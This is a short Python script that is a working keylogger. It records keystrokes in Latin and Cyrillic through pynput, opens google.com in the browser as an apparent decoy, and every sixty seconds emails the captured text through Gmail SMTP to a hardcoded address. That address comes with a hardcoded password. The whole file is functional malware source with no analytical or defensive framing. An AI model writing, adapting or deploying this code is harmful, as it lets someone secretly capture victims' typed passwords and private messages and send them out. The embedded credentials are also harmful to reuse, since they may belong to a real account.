#!/usr/bin/python
# -*- coding: utf8 -*-

import pynput.keyboard
import threading
import smtplib

import webbrowser
webbrowser.open('https://google.com', new=1)

class Logger:
    def __init__(self, time_interval, email, password):
        self.log = ""
        self.interval = time_interval
        self.email = email
        self.password = password

    def append_log(self, string):
        self.log = self.log + string

    def proccess_key_press(self, key):
        ignor = " ! \" # $ % & ' ( ) * + , - . / 0 1 2 3 4 5 6 7 8 9 : ; < = > ? @ Q W E R T Y U I O P L K J H G F D   S A Z X C V B N M q w e r t y u i o p a s d f g h j k l z x c v b n m [ \ ] ^ _ ` { } | ~ Ђ Ѓ ‚ ѓ „ … † ‡ € ‰ Љ ‹   ‹ Њ Ќ Ћ Џ ђ ‘ ’ “ ” • – — ™ љ › њ ќ ћ џ Ў ў Ћ ¤ Ґ ¦ § Ё © Є « ¬ ® Ї ° ± І і ґ µ ¶ · ё № є » ј Ѕ ѕ ї Й Ц У К Е Н Г Ш Щ З Х Ъ Ф Ы В А П Р О Л Д Ж Э Я  Ч С М И Т Ь Б Ю й ц у к е н г ш щ з х ъ ф ы в а п р о л д ж э я ч с м и т ь б ю і ї Ї І є Є Key.enter Key.space "

        current_key = str(key).replace("'", "")
        if current_key in ignor:
            if current_key == "Key.enter":
                current_key = "\n"
            if current_key == "Key.space":
                current_key = " "
            self.append_log(current_key)

    def report(self):
        print(self.log)
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email ,email, message)
        server.quit()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.proccess_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

keylogger = Logger(60, "kkosmos381@gmail.com", "Root123kosmos")
keylogger.start()